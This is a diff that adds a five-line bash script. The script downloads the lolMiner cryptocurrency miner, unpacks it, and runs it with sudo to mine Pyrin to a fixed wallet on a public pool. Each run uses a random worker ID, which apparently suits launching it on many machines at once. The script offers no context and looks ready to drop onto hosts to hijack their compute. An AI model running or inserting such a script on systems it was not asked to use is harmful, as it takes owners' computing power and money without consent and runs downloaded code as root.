@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.87/lolMiner_v1.87_Lin64.tar.gz
+tar xf lolMiner_v1.87_Lin64.tar.gz
+cd 1.87
+sudo ./lolMiner -a PYRIN -p de.pyrin.herominers.com:1177 -u pyrin:qz5mu36m6hy997g3ytu92rwlhr3exvpdhyke3vhmak02lxc9n7xxkcrac36jx.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl 
